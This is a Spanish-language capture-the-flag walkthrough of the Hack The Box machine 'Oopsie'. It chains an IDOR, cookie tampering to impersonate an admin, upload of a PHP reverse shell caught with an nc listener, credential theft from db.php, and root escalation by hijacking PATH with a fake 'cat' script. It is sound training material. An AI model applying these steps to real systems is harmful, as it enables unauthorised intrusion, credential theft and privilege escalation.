# Manual Técnico: Hack The Box — Máquina Oopsie
### Explotación de IDOR, Cookie Manipulation, File Upload y Path Hijacking en Entornos Linux

---

## Tabla de Contenidos

1. [Introducción y Contexto](#1-introducción-y-contexto)
2. [Reconocimiento y Enumeración](#2-reconocimiento-y-enumeración)
   - 2.1 [Escaneo de Puertos con Nmap](#21-escaneo-de-puertos-con-nmap)
3. [Configuración del Entorno: Burp Suite y FoxyProxy](#3-configuración-del-entorno-burp-suite-y-foxyproxy)
   - 3.1 [Concepto Teórico: Proxy de Interceptación](#31-concepto-teórico-proxy-de-interceptación)
   - 3.2 [Instalación y Configuración de FoxyProxy](#32-instalación-y-configuración-de-foxyproxy)
   - 3.3 [Configuración del Certificado CA de Burp Suite](#33-configuración-del-certificado-ca-de-burp-suite)
   - 3.4 [Uso Básico: Intercepción y HTTP History](#34-uso-básico-intercepción-y-http-history)
4. [Análisis de la Aplicación Web](#4-análisis-de-la-aplicación-web)
   - 4.1 [Fingerprinting con Wappalyzer](#41-fingerprinting-con-wappalyzer)
   - 4.2 [Identificación del Panel de Login mediante Inspección del Código Fuente](#42-identificación-del-panel-de-login-mediante-inspección-del-código-fuente)
5. [Vulnerabilidad: Insecure Direct Object Reference (IDOR)](#5-vulnerabilidad-insecure-direct-object-reference-idor)
   - 5.1 [Concepto Teórico](#51-concepto-teórico)
   - 5.2 [Explotación del IDOR para Obtener el Identificador de Administrador](#52-explotación-del-idor-para-obtener-el-identificador-de-administrador)
6. [Vulnerabilidad: Cookie Manipulation](#6-vulnerabilidad-cookie-manipulation)
   - 6.1 [Concepto Teórico](#61-concepto-teórico)
   - 6.2 [Modificación de Cookies para Acceder al Panel de Uploads](#62-modificación-de-cookies-para-acceder-al-panel-de-uploads)
7. [Vulnerabilidad: Unrestricted File Upload y Reverse Shell](#7-vulnerabilidad-unrestricted-file-upload-y-reverse-shell)
   - 7.1 [Concepto Teórico](#71-concepto-teórico)
   - 7.2 [Generación del Payload PHP](#72-generación-del-payload-php)
   - 7.3 [Subida del Archivo y Localización mediante Fuzzing](#73-subida-del-archivo-y-localización-mediante-fuzzing)
   - 7.4 [Establecimiento de la Reverse Shell](#74-establecimiento-de-la-reverse-shell)
8. [Enumeración Post-Explotación](#8-enumeración-post-explotación)
   - 8.1 [Búsqueda de Archivos PHP con Credenciales](#81-búsqueda-de-archivos-php-con-credenciales)
   - 8.2 [Lectura del Archivo db.php](#82-lectura-del-archivo-dbphp)
9. [Escalada de Privilegios: SSH y Enumeración de Grupos](#9-escalada-de-privilegios-ssh-y-enumeración-de-grupos)
   - 9.1 [Acceso por SSH con Credenciales Obtenidas](#91-acceso-por-ssh-con-credenciales-obtenidas)
   - 9.2 [Identificación del Grupo Bugtracker](#92-identificación-del-grupo-bugtracker)
   - 9.3 [Localización del Binario Bugtracker](#93-localización-del-binario-bugtracker)
   - 9.4 [Análisis de Permisos del Binario](#94-análisis-de-permisos-del-binario)
10. [Escalada de Privilegios: Path Hijacking](#10-escalada-de-privilegios-path-hijacking)
    - 10.1 [Concepto Teórico: Variable PATH y PATH Hijacking](#101-concepto-teórico-variable-path-y-path-hijacking)
    - 10.2 [Creación del Binario `cat` Malicioso](#102-creación-del-binario-cat-malicioso)
    - 10.3 [Modificación del PATH y Explotación](#103-modificación-del-path-y-explotación)
11. [Captura de las Flags](#11-captura-de-las-flags)
12. [Resumen de Puntos Clave](#12-resumen-de-puntos-clave)
13. [Inventario Final de Herramientas](#13-inventario-final-de-herramientas)

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 1. Introducción y Contexto

La máquina **Oopsie** de Hack The Box es un entorno de práctica basado en **Linux** que requiere la explotación encadenada de múltiples vulnerabilidades web y de sistema. La máquina simula una aplicación de gestión de un concesionario de automóviles con controles de acceso deficientemente implementados.

Las vulnerabilidades explotadas en esta máquina son:

- **Insecure Direct Object Reference (IDOR):** permite acceder a información de otros usuarios manipulando parámetros de la URL.
- **Cookie Manipulation:** permite suplantar la sesión de un usuario administrador modificando los valores de las cookies en texto claro.
- **Unrestricted File Upload:** permite subir archivos PHP arbitrarios al servidor y ejecutarlos remotamente.
- **Path Hijacking:** permite escalar privilegios a root manipulando la variable de entorno `$PATH` para sustituir un binario del sistema.

El flujo de ataque sigue la metodología estándar de pruebas de penetración: reconocimiento → enumeración → identificación de vulnerabilidades → explotación → post-explotación → escalada de privilegios → captura de la flag.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 2. Reconocimiento y Enumeración

### 2.1 Escaneo de Puertos con Nmap

Se realiza un escaneo de los puertos principales con detección de versiones y ejecución de scripts básicos de Nmap.

```bash
nmap -sV -sC --min-rate 5000 <IP_OBJETIVO> -oN escaneo_oopsie
```

**Descripción de los parámetros:**

| Flag              | Descripción                                                                          |
|-------------------|--------------------------------------------------------------------------------------|
| `-sV`             | Detecta versiones de los servicios en ejecución.                                     |
| `-sC`             | Ejecuta los scripts NSE (Nmap Scripting Engine) por defecto.                         |
| `--min-rate 5000` | Establece una tasa mínima de 5000 paquetes por segundo para acelerar el escaneo.     |
| `<IP_OBJETIVO>`   | Dirección IP del sistema objetivo.                                                   |
| `-oN escaneo_oopsie` | Guarda la salida en formato legible en el archivo especificado.                  |

**Puertos relevantes identificados:**

| Puerto | Servicio    | Descripción                                                                 |
|--------|-------------|-----------------------------------------------------------------------------|
| 22     | SSH         | Secure Shell. Vector de acceso remoto una vez obtenidas credenciales.       |
| 80     | HTTP        | Servidor web Apache. Aloja la aplicación web vulnerable.                    |

> **Nota:** El TTL de los paquetes ICMP en esta máquina es aproximadamente 63, lo que indica un sistema operativo Linux (valor base 64, decrementado en un salto de red).

**Resumen de puntos clave — Sección 2:**
- El TTL permite identificar el sistema operativo sin herramientas adicionales: ~64 = Linux, ~128 = Windows.
- El puerto 22 (SSH) es un vector de acceso remoto; debe registrarse para uso posterior cuando se obtengan credenciales.
- El flag `-oN` de Nmap guarda la salida para referencia posterior; su uso es recomendable en toda auditoría.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 3. Configuración del Entorno: Burp Suite y FoxyProxy

### 3.1 Concepto Teórico: Proxy de Interceptación

Un **proxy de interceptación** es una herramienta que se sitúa entre el navegador del usuario y el servidor web, permitiendo capturar, inspeccionar y modificar las peticiones HTTP/HTTPS antes de que lleguen a su destino. En el contexto de auditorías web, **Burp Suite** es la herramienta estándar de referencia para esta función.

El proxy de interceptación permite:
- Visualizar el contenido completo de las peticiones y respuestas HTTP.
- Modificar parámetros, cabeceras y cookies en tiempo real.
- Mantener un histórico de todas las peticiones realizadas durante la sesión.

---

### 3.2 Instalación y Configuración de FoxyProxy

**FoxyProxy** es una extensión de navegador que permite gestionar configuraciones de proxy de forma rápida. Es necesaria para redirigir el tráfico del navegador a través de Burp Suite.

**Instalación:**
1. Acceder a la tienda de extensiones del navegador (Firefox Add-ons o Chrome Web Store).
2. Buscar **FoxyProxy Standard** y proceder a su instalación.
3. Anclar la extensión a la barra de herramientas del navegador.

**Configuración del proxy para Burp Suite:**
1. Hacer clic en el icono de FoxyProxy → seleccionar **Options**.
2. Navegar a la pestaña **Proxies** → añadir un nuevo proxy.
3. Configurar los siguientes valores:

| Campo      | Valor       | Descripción                                              |
|------------|-------------|----------------------------------------------------------|
| Nombre     | `BurpSuite` | Identificador descriptivo del proxy.                     |
| Tipo       | `HTTP`      | Protocolo de las peticiones web a interceptar.           |
| Hostname   | `127.0.0.1` | Dirección de loopback; el proxy escucha en local.        |
| Puerto     | `8080`      | Puerto por defecto del listener de Burp Suite.           |

4. Guardar la configuración.
5. Para activar el proxy: hacer clic en el icono de FoxyProxy y seleccionar el perfil `BurpSuite`.
6. Para desactivarlo: seleccionar la opción **Desactivar** en el mismo desplegable.

> **Advertencia:** Si FoxyProxy está activo pero Burp Suite no está en ejecución, todas las peticiones del navegador fallarán al no existir un listener en `127.0.0.1:8080`. Desactivar siempre FoxyProxy cuando Burp Suite no esté en uso.

---

### 3.3 Configuración del Certificado CA de Burp Suite

Para interceptar tráfico HTTPS sin errores de certificado, es necesario importar el certificado de autoridad (CA) de Burp Suite en el navegador.

**Descarga del certificado:**

Con el proxy de FoxyProxy activo y Burp Suite en ejecución, navegar a la siguiente URL en el navegador:

```
http://127.0.0.1:8080
```

En la página resultante, hacer clic en **CA Certificate** para descargar el archivo `cacert.der`.

**Importación en Firefox:**
1. Navegar a **Settings** → buscar `certificates` → hacer clic en **View Certificates**.
2. Seleccionar **Import** y cargar el archivo `cacert.der` descargado.
3. Marcar la opción **Trust this CA to identify websites** y confirmar.

Una vez importado el certificado, el navegador podrá navegar a través del proxy de Burp Suite sin errores de certificado, incluso con el intercept desactivado.

---

### 3.4 Uso Básico: Intercepción y HTTP History

Burp Suite opera en dos modos principales respecto a la interceptación:

| Modo             | Comportamiento                                                                                       |
|------------------|------------------------------------------------------------------------------------------------------|
| **Intercept ON** | Bloquea cada petición HTTP hasta que el usuario decida enviarla (`Forward`) o descartarla (`Drop`). |
| **Intercept OFF** | Las peticiones pasan automáticamente. Quedan registradas en la pestaña **HTTP History**.            |

La pestaña **HTTP History** (dentro del módulo **Proxy**) almacena un registro de todas las peticiones interceptadas durante la sesión, permitiendo revisarlas y reutilizarlas posteriormente.

**Resumen de puntos clave — Sección 3:**
- FoxyProxy redirige el tráfico del navegador al listener de Burp Suite en `127.0.0.1:8080`.
- El certificado CA de Burp Suite debe importarse en el navegador para interceptar tráfico HTTPS correctamente.
- Con Intercept OFF, Burp Suite sigue registrando las peticiones en HTTP History sin bloquearlas.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 4. Análisis de la Aplicación Web

### 4.1 Fingerprinting con Wappalyzer

**Wappalyzer** es una extensión del navegador que identifica de forma automática las tecnologías utilizadas por una aplicación web: lenguaje de programación del servidor, frameworks, servidor web, CMS, etc.

Al inspeccionar la aplicación con Wappalyzer se confirma que el servidor utiliza **PHP** como lenguaje de scripting del lado del servidor. Esta información es relevante para planificar el vector de ataque mediante subida de archivos maliciosos.

---

### 4.2 Identificación del Panel de Login mediante Inspección del Código Fuente

Al navegar a la página principal de la aplicación, no se muestra directamente un panel de autenticación. Para localizar la ruta del login se puede inspeccionar el código fuente de la página.

**Método: Inspección del código fuente con `Ctrl+U`**

Pulsando `Ctrl+U` en el navegador se abre una nueva pestaña con el HTML completo de la página en crudo. Revisando el código fuente al final del documento, se identifica una referencia a un archivo JavaScript alojado en la siguiente ruta:

```
/cdn-cgi/login/
```

Esta ruta revela la ubicación del panel de login de la aplicación.

**Verificación:** Navegar a `http://<IP_OBJETIVO>/cdn-cgi/login/` confirma la existencia del formulario de autenticación.

> **Nota:** La inspección manual del código fuente es una técnica complementaria al fuzzing de directorios. En ocasiones, el código fuente contiene referencias directas a rutas, endpoints y recursos sensibles que no son visibles en la interfaz de usuario.

**Resumen de puntos clave — Sección 4:**
- Wappalyzer permite identificar el stack tecnológico del servidor sin necesidad de análisis manual profundo.
- La combinación de `Ctrl+U` (código fuente) y las herramientas de desarrollador (`F12`) permite identificar rutas y endpoints ocultos.
- Los archivos JavaScript referenciados en el HTML pueden revelar rutas internas de la aplicación.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 5. Vulnerabilidad: Insecure Direct Object Reference (IDOR)

### 5.1 Concepto Teórico

**Insecure Direct Object Reference (IDOR)** es una vulnerabilidad de control de acceso que se produce cuando una aplicación web utiliza identificadores predecibles o secuenciales para referenciar objetos internos (registros de base de datos, archivos, perfiles de usuario, etc.) y no verifica que el usuario que realiza la solicitud tenga autorización para acceder al objeto referenciado.

**Impacto potencial:**
- Acceso a información personal de otros usuarios (nombres, correos, direcciones, números de cuenta, etc.).
- Obtención de identificadores y datos de usuarios con privilegios elevados.
- En entornos bancarios o sanitarios, exposición de datos altamente sensibles.

**Indicadores de superficie de ataque:**
- Parámetros en la URL con valores numéricos secuenciales: `?id=2`, `?user=3`, `?account=1001`.
- Identificadores cortos o predecibles en lugar de UUIDs o tokens aleatorios.

---

### 5.2 Explotación del IDOR para Obtener el Identificador de Administrador

Tras autenticarse en la aplicación como usuario invitado (`Login as Guest`), la URL de la sección **Account** presenta el siguiente formato:

```
http://<IP_OBJETIVO>/cdn-cgi/login/admin.php?content=accounts&id=2
```

El parámetro `id=2` corresponde al identificador del usuario invitado. Modificando este valor a `id=1` en la URL, la aplicación devuelve los datos del perfil del usuario administrador sin verificar los permisos del solicitante:

```
http://<IP_OBJETIVO>/cdn-cgi/login/admin.php?content=accounts&id=1
```

La respuesta revela el identificador único del usuario administrador, necesario para la siguiente fase del ataque.

> **Buena práctica en auditorías:** Cuando se identifiquen parámetros con valores numéricos bajos y secuenciales, iterar sobre ellos de forma sistemática para identificar todos los perfiles de usuario existentes.

**Resumen de puntos clave — Sección 5:**
- IDOR se produce cuando la aplicación no valida que el usuario tiene permisos para acceder al objeto solicitado.
- Los identificadores secuenciales (`id=1`, `id=2`) son señales claras de una posible vulnerabilidad IDOR.
- La explotación permite obtener el identificador del administrador, necesario para la suplantación de sesión.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 6. Vulnerabilidad: Cookie Manipulation

### 6.1 Concepto Teórico

Las **cookies** son tokens almacenados en el navegador del cliente que las aplicaciones web utilizan para mantener el estado de la sesión y los privilegios del usuario. Cuando una aplicación almacena información de privilegios en las cookies en **texto claro** y no las firma ni cifra criptográficamente, es posible modificar sus valores para suplantar la identidad de otros usuarios.

En condiciones seguras, los valores de sesión deberían ser tokens opacos (por ejemplo, JWTs firmados con clave privada) que no puedan ser manipulados sin invalidarse. El almacenamiento de roles o identificadores en texto claro en las cookies es una configuración insegura.

---

### 6.2 Modificación de Cookies para Acceder al Panel de Uploads

Al autenticarse como usuario invitado, la aplicación establece dos cookies:

| Cookie  | Valor (usuario invitado) | Descripción                              |
|---------|--------------------------|------------------------------------------|
| `role`  | `guest`                  | Rol del usuario dentro de la aplicación. |
| `user`  | `<ID_GUEST>`             | Identificador único del usuario.         |

El panel de **Uploads** requiere privilegios de administrador y está bloqueado para el usuario invitado. Para acceder, es necesario modificar ambas cookies con los valores correspondientes al usuario administrador.

**Procedimiento de modificación con las herramientas de desarrollador (`F12`):**

1. Abrir las herramientas de desarrollador (`F12`) → pestaña **Storage** o **Application** → sección **Cookies**.
2. Localizar la cookie `role` y cambiar su valor a `admin`.
3. Localizar la cookie `user` y cambiar su valor al identificador del administrador obtenido mediante IDOR.
4. Recargar la página del panel de Uploads.

Tras la recarga, la aplicación valida las cookies modificadas y permite el acceso al panel de subida de archivos.

**Resumen de puntos clave — Sección 6:**
- Las cookies en texto claro son susceptibles de manipulación directa desde el navegador.
- Es necesario modificar **ambas** cookies simultáneamente (`role` y `user`) para que la validación del servidor sea exitosa.
- En aplicaciones correctamente configuradas, las cookies de sesión son tokens opacos y firmados que no admiten esta manipulación.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 7. Vulnerabilidad: Unrestricted File Upload y Reverse Shell

### 7.1 Concepto Teórico

**Unrestricted File Upload** es una vulnerabilidad que permite a un usuario subir archivos de cualquier tipo a un servidor sin restricciones de validación de extensión o contenido. Si el servidor ejecuta el código contenido en los archivos subidos (por ejemplo, PHP), el atacante puede lograr **Remote Code Execution (RCE)** cargando un archivo con código malicioso y accediendo a él mediante el navegador.

Una **reverse shell** es una conexión de terminal iniciada desde la máquina víctima hacia la máquina atacante. A diferencia de una conexión directa (*bind shell*), la reverse shell es útil cuando la máquina víctima se encuentra detrás de un firewall que bloquea conexiones entrantes pero permite conexiones salientes.

---

### 7.2 Generación del Payload PHP

Se utiliza la plataforma **revshells.com** para generar el código de la reverse shell con los parámetros correctos.

**Configuración en revshells.com:**

| Parámetro        | Valor                  | Descripción                                              |
|------------------|------------------------|----------------------------------------------------------|
| IP               | `<IP_ATACANTE>`        | IP de la interfaz `tun0` (VPN de Hack The Box).          |
| Puerto           | `1337` (o cualquier libre) | Puerto en el que escuchará Netcat en la máquina atacante. |
| Sistema Operativo| Linux                  | Sistema operativo de la máquina víctima.                 |
| Shell            | `bash`                 | Intérprete de comandos a utilizar en la reverse shell.   |
| Tipo de payload  | PHP PentestMonkey      | Payload PHP estándar para reverse shells.                |

Una vez generado el código, se crea el archivo PHP en la máquina atacante:

```bash
nano rev.php
```

Pegar el contenido del payload generado dentro del archivo y guardarlo con `Ctrl+X` → `Y` → `Enter`.

**Descripción de los parámetros:**

| Elemento   | Descripción                                                                       |
|------------|-----------------------------------------------------------------------------------|
| `nano`     | Editor de texto en terminal. Permite crear y editar archivos directamente.        |
| `rev.php`  | Nombre del archivo; debe terminar en `.php` para que el servidor lo ejecute.      |

---

### 7.3 Subida del Archivo y Localización mediante Fuzzing

Con acceso al panel de Uploads como administrador, se sube el archivo `rev.php` utilizando el formulario de la aplicación. La aplicación confirma que el archivo se ha subido correctamente.

Para determinar la ruta donde se almacenan los archivos subidos, se realiza fuzzing de directorios:

```bash
dirb http://<IP_OBJETIVO>/
```

**Descripción de los parámetros:**

| Elemento          | Descripción                                                                                  |
|-------------------|----------------------------------------------------------------------------------------------|
| `dirb`            | Herramienta de fuzzing de directorios web. Utiliza un diccionario predeterminado si no se especifica ninguno. |
| `http://<IP_OBJETIVO>/` | URL base sobre la que se realizará la búsqueda de directorios.                         |

El resultado del fuzzing identifica la existencia del directorio `/uploads/`, que es la ruta donde se almacenan los archivos subidos a través del panel de la aplicación.

---

### 7.4 Establecimiento de la Reverse Shell

**Paso 1:** Poner Netcat en escucha en la máquina atacante en el puerto configurado en el payload:

```bash
nc -lvnp 1337
```

**Descripción de los parámetros:**

| Flag   | Descripción                                                                              |
|--------|------------------------------------------------------------------------------------------|
| `-l`   | Modo escucha (*listen*). Espera conexiones entrantes.                                    |
| `-v`   | Modo verboso. Muestra información detallada sobre la conexión establecida.               |
| `-n`   | No resuelve nombres DNS. Utiliza únicamente direcciones IP.                              |
| `-p 1337` | Puerto en el que se acepta la conexión entrante.                                     |

**Paso 2:** Ejecutar el archivo PHP subido accediendo a él desde el navegador:

```
http://<IP_OBJETIVO>/uploads/rev.php
```

Al cargar la URL, el servidor ejecuta el código PHP, que establece una conexión hacia la máquina atacante. Netcat recibe la conexión y presenta una terminal interactiva como el usuario `www-data`.

**Resumen de puntos clave — Sección 7:**
- Unrestricted File Upload permite ejecutar código arbitrario si el servidor procesa los archivos subidos.
- La reverse shell se inicia desde la máquina víctima hacia el atacante; el puerto debe estar en escucha con Netcat antes de ejecutar el payload.
- El directorio de uploads puede identificarse mediante fuzzing con `dirb` o mediante inspección de la URL de la aplicación.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 8. Enumeración Post-Explotación

### 8.1 Búsqueda de Archivos PHP con Credenciales

Con acceso como `www-data`, se realiza una búsqueda de todos los archivos PHP en el sistema para identificar posibles archivos de configuración con credenciales embebidas.

```bash
find / -type f -name "*.php" 2>/dev/null
```

**Descripción de los parámetros:**

| Elemento       | Descripción                                                                                     |
|----------------|-------------------------------------------------------------------------------------------------|
| `find`         | Comando para buscar archivos y directorios en el sistema de ficheros.                           |
| `/`            | Punto de inicio de la búsqueda: directorio raíz (búsqueda en todo el sistema).                  |
| `-type f`      | Restringe los resultados a ficheros regulares (excluye directorios, enlaces simbólicos, etc.).  |
| `-name "*.php"` | Filtra los resultados por nombre, incluyendo solo archivos con extensión `.php`.               |
| `2>/dev/null`  | Redirige los mensajes de error (p. ej., "Permission denied") a `/dev/null` para suprimir ruido. |

Entre los resultados, se identifica el archivo `db.php` ubicado en la ruta de la aplicación.

---

### 8.2 Lectura del Archivo db.php

```bash
cat /var/www/html/cdn-cgi/login/db.php
```

**Descripción del comando:**

| Elemento  | Descripción                                                                     |
|-----------|---------------------------------------------------------------------------------|
| `cat`     | Muestra el contenido de un archivo en la salida estándar de la terminal.        |
| Ruta      | Ruta absoluta al archivo de configuración de la base de datos de la aplicación. |

El contenido del archivo revela las credenciales de conexión a la base de datos, incluyendo el usuario del sistema `robert` y su contraseña en texto claro:

| Campo    | Valor              |
|----------|--------------------|
| Usuario  | `robert`           |
| Contraseña | `<contraseña>`   |

> **Nota:** Los archivos `db.php` en aplicaciones web frecuentemente contienen credenciales de base de datos en texto claro. Su localización debe ser prioritaria durante la fase de post-explotación.

**Resumen de puntos clave — Sección 8:**
- El comando `find` permite localizar archivos por extensión en todo el sistema de ficheros de forma eficiente.
- Los archivos de configuración de base de datos (`db.php`, `config.php`, `.env`) son objetivos prioritarios en la enumeración post-explotación.
- La redirección `2>/dev/null` filtra los errores de permisos y mejora la legibilidad de los resultados.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 9. Escalada de Privilegios: SSH y Enumeración de Grupos

### 9.1 Acceso por SSH con Credenciales Obtenidas

Con las credenciales del usuario `robert` y el puerto 22 (SSH) abierto, se establece una sesión SSH para obtener una terminal interactiva más estable.

```bash
ssh robert@<IP_OBJETIVO>
```

**Descripción de los parámetros:**

| Elemento          | Descripción                                                                     |
|-------------------|---------------------------------------------------------------------------------|
| `ssh`             | Cliente SSH para conexiones remotas seguras.                                    |
| `robert`          | Nombre del usuario con el que se autenticará la sesión.                         |
| `<IP_OBJETIVO>`   | Dirección IP de la máquina víctima.                                             |

Cuando se solicite la contraseña, introducir la obtenida del archivo `db.php`.

---

### 9.2 Identificación del Grupo Bugtracker

Una vez autenticado como `robert`, se identifican los grupos a los que pertenece el usuario:

```bash
id
```

**Descripción del comando:**

| Elemento | Descripción                                                                                          |
|----------|------------------------------------------------------------------------------------------------------|
| `id`     | Muestra el UID, GID y grupos suplementarios del usuario actual.                                      |

La salida revela que el usuario `robert` pertenece al grupo **bugtracker**, lo que indica la existencia de recursos del sistema asociados a dicho grupo.

---

### 9.3 Localización del Binario Bugtracker

Se busca en todo el sistema de ficheros los archivos pertenecientes al grupo `bugtracker`:

```bash
find / -group bugtracker 2>/dev/null
```

**Descripción de los parámetros:**

| Flag              | Descripción                                                                              |
|-------------------|------------------------------------------------------------------------------------------|
| `-group bugtracker` | Filtra los resultados mostrando únicamente archivos cuyo grupo propietario es `bugtracker`. |

El resultado identifica el binario ejecutable `/usr/bin/bugtracker`.

---

### 9.4 Análisis de Permisos del Binario

Se inspeccionan los permisos del binario para comprender con qué privilegios se ejecuta:

```bash
ls -la /usr/bin/bugtracker
```

**Descripción de los parámetros:**

| Flag  | Descripción                                                                                |
|-------|--------------------------------------------------------------------------------------------|
| `-l`  | Formato largo: muestra permisos, propietario, grupo, tamaño y fecha de modificación.       |
| `-a`  | Incluye archivos ocultos (los que comienzan por `.`).                                       |

La salida muestra que el binario tiene activado el bit **SUID** (`-rwsr-xr-x`) y es propiedad del usuario `root`. Esto significa que, independientemente del usuario que lo ejecute, el binario se ejecuta con privilegios de `root`.

> **Concepto: SUID (Set User ID).** Bit especial de permisos en Linux que hace que un ejecutable se ejecute con los privilegios del propietario del archivo en lugar de los del usuario que lo invoca. Un binario SUID propiedad de root es ejecutado siempre como root.

**Resumen de puntos clave — Sección 9:**
- El comando `id` permite identificar los grupos del usuario actual, revelando posibles vectores de escalada.
- La combinación `find / -group <nombre_grupo>` localiza todos los recursos del sistema asociados a un grupo.
- El bit SUID en un binario indica que se ejecuta con los privilegios de su propietario, no del invocador.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 10. Escalada de Privilegios: Path Hijacking

### 10.1 Concepto Teórico: Variable PATH y Path Hijacking

La variable de entorno **`$PATH`** almacena una lista de directorios separados por dos puntos (`:`). Cuando se ejecuta un comando sin especificar su ruta absoluta (por ejemplo, `cat` en lugar de `/bin/cat`), el sistema busca el binario correspondiente en cada directorio del `$PATH`, **en orden de izquierda a derecha**, ejecutando el primero que encuentre.

```bash
echo $PATH
# Ejemplo de salida: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Path Hijacking** consiste en manipular el `$PATH` para que el sistema encuentre primero un binario falso controlado por el atacante en lugar del binario legítimo del sistema. Si el proceso que invoca el binario tiene privilegios elevados (por ejemplo, un binario SUID root), el binario falso se ejecutará con dichos privilegios.

---

### 10.2 Creación del Binario `cat` Malicioso

Al ejecutar el binario `bugtracker` con cualquier argumento, se observa que internamente llama al comando `cat` para intentar leer un archivo en la ruta `/root/reports/`. El error devuelto no es "Permission denied" sino "No such file or directory", lo que confirma que el `cat` se está ejecutando con privilegios de `root`.

Se crea un archivo ejecutable llamado `cat` en el directorio `/tmp/` cuyo contenido lanza una sesión de `bash`:

```bash
cd /tmp
nano cat
```

Contenido del archivo `cat` malicioso:

```bash
#!/bin/bash
/bin/bash
```

**Descripción del contenido:**

| Elemento      | Descripción                                                                          |
|---------------|--------------------------------------------------------------------------------------|
| `#!/bin/bash` | Shebang: indica al sistema que el script debe interpretarse con `/bin/bash`.         |
| `/bin/bash`   | Lanza una nueva sesión interactiva de Bash al ser ejecutado.                         |

Asignar permisos de ejecución al archivo creado:

```bash
chmod +x /tmp/cat
```

**Descripción de los parámetros:**

| Elemento  | Descripción                                                                              |
|-----------|------------------------------------------------------------------------------------------|
| `chmod`   | Cambia los permisos de un archivo.                                                       |
| `+x`      | Añade el permiso de ejecución para todos los tipos de usuario (propietario, grupo, otros). |
| `/tmp/cat`| Ruta al archivo al que se aplica el cambio de permisos.                                  |

---

### 10.3 Modificación del PATH y Explotación

Se modifica la variable `$PATH` para que el directorio `/tmp/` sea buscado en primer lugar:

```bash
export PATH=/tmp:$PATH
```

**Descripción del comando:**

| Elemento       | Descripción                                                                                          |
|----------------|------------------------------------------------------------------------------------------------------|
| `export`       | Exporta la variable al entorno del proceso actual y todos sus subprocesos.                           |
| `PATH=/tmp:$PATH` | Antepone `/tmp` al valor actual del `$PATH`, haciéndolo el primer directorio de búsqueda.        |

Verificación del nuevo `$PATH`:

```bash
echo $PATH
# Salida esperada: /tmp:/usr/local/sbin:/usr/local/bin:...
```

**Explotación:** Ejecutar el binario `bugtracker` con cualquier argumento:

```bash
/usr/bin/bugtracker
```

Al invocar `cat` internamente, el sistema busca el binario en `/tmp/` primero (por el orden modificado del `$PATH`), encuentra el `cat` falso y lo ejecuta con privilegios de `root`. Esto abre una sesión interactiva de Bash como `root`.

**Resumen de puntos clave — Sección 10:**
- El `$PATH` determina el orden de búsqueda de binarios; anteponiendo un directorio controlado, se puede sustituir cualquier comando.
- La técnica Path Hijacking es efectiva cuando un binario SUID llama a comandos sin especificar su ruta absoluta.
- La misma técnica existe en entornos Windows bajo el nombre de **DLL Hijacking** (para librerías) y **PATH variable manipulation** (para ejecutables).

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 11. Captura de las Flags

### Flag del usuario

Con acceso como `robert` (o como `www-data` con la reverse shell), navegar a la carpeta personal del usuario:

```bash
cat /home/robert/user.txt
```

### Flag de root

Con acceso a la sesión de `root` obtenida mediante Path Hijacking, y teniendo en cuenta que el `cat` del `$PATH` apunta al binario falso, utilizar la ruta absoluta del comando para leer el archivo:

```bash
/bin/cat /root/root.txt
```

> **Nota:** Tras la escalada por Path Hijacking, el binario `cat` del `$PATH` sigue siendo el malicioso. Para utilizar el `cat` original sin modificar el `$PATH`, es necesario llamar a su ruta absoluta `/bin/cat`, o bien eliminar el archivo falso en `/tmp/cat`.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 12. Resumen de Puntos Clave

**Reconocimiento:**
- El TTL del ping permite identificar el sistema operativo sin herramientas adicionales (~64 = Linux, ~128 = Windows).
- Nmap con `-sV -sC` proporciona información de servicios y versiones; el flag `-oN` guarda la salida.

**Configuración del Entorno:**
- Burp Suite requiere FoxyProxy para interceptar tráfico del navegador y un certificado CA importado para tráfico HTTPS.
- Con Intercept OFF, Burp Suite registra las peticiones en HTTP History sin bloquear la navegación.

**IDOR:**
- Se produce cuando la aplicación no verifica que el usuario tiene permisos para acceder al objeto solicitado.
- Identificadores numéricos y secuenciales (`id=1`, `id=2`) son indicadores claros de superficie de ataque IDOR.

**Cookie Manipulation:**
- Las cookies en texto claro pueden manipularse directamente desde el navegador.
- Ambas cookies (`role` e `user`) deben modificarse simultáneamente para que la validación sea exitosa.

**Unrestricted File Upload:**
- Un servidor PHP que no valida la extensión de los archivos subidos permite la ejecución remota de código.
- El directorio de uploads se puede localizar mediante fuzzing (`dirb`) o inspección de la URL de la aplicación.

**Post-Explotación:**
- Los archivos `db.php` contienen frecuentemente credenciales de base de datos en texto claro.
- El comando `find / -type f -name "*.php"` identifica todos los archivos PHP del sistema.

**Escalada de Privilegios:**
- El bit SUID en un binario permite su ejecución con los privilegios del propietario (root), independientemente del usuario invocador.
- El Path Hijacking consiste en anteponer un directorio controlado al `$PATH` para sustituir un binario del sistema por uno malicioso.
- Tras la escalada, los comandos del sistema que hayan sido sustituidos deben llamarse por su ruta absoluta.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 13. Inventario Final de Herramientas

| Herramienta / Plataforma | Tipo              | Descripción                                                                                          | Instalación / Disponibilidad                              |
|--------------------------|-------------------|------------------------------------------------------------------------------------------------------|-----------------------------------------------------------|
| **Nmap**                 | Escáner de red    | Enumeración de puertos, servicios y versiones. Incluye scripts NSE.                                  | Preinstalado en Kali Linux                                |
| **Burp Suite**           | Proxy de intercepción | Intercepta, inspecciona y modifica peticiones HTTP/HTTPS entre el navegador y el servidor web.   | Preinstalado en Kali Linux (`burpsuite` en el menú)       |
| **FoxyProxy**            | Extensión de navegador | Gestiona configuraciones de proxy en el navegador para redirigir tráfico a Burp Suite.          | Firefox Add-ons / Chrome Web Store                        |
